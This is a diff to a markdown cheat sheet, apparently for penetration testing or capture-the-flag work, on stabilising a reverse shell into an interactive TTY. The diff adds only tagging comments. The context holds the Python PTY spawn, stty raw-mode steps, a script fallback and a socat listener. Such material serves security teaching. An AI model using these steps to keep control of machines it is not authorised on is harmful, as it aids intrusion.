@@ -8,6 +8,7 @@ This sequence upgrades the dumb shell to a fully interactive TTY.
 
 **1. Spawn a PTY (Inside the dumb shell)**
 
+<!-- cmd: linux -->
 ```bash
 # Try python3 first
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -22,6 +23,7 @@ Press `Ctrl+Z` to background the netcat listener. You will drop back to your loc
 
 **3. Configure your local terminal to send raw keystrokes (Attacker machine)**
 
+<!-- cmd: linux -->
 ```bash
 stty raw -echo; fg
 ```
@@ -30,6 +32,7 @@ stty raw -echo; fg
 
 **4. Set environment variables (Inside the stabilized shell)**
 
+<!-- cmd: linux -->
 ```bash
 export TERM=xterm
 export SHELL=bash
@@ -39,6 +42,7 @@ export SHELL=bash
 
 If you run `nano` or `clear` and the screen breaks, your terminal dimensions are mismatched.
 
+<!-- cmd: linux -->
 ```bash
 # On your local machine (open a new tab):
 stty size
@@ -53,6 +57,7 @@ stty rows 40 cols 130
 If Python is not installed on the target, try:
 
 ### Script
+<!-- cmd: linux -->
 ```bash
 /usr/bin/script -qc /bin/bash /dev/null
 # Then proceed with Ctrl+Z -> stty raw -echo; fg
@@ -60,6 +65,7 @@ If Python is not installed on the target, try:
 
 ### Socat
 Upload `socat` to the target.
+<!-- cmd: linux -->
 ```bash
 # Attacker listener
 socat file:`tty`,raw,echo=0 tcp-listen:4444
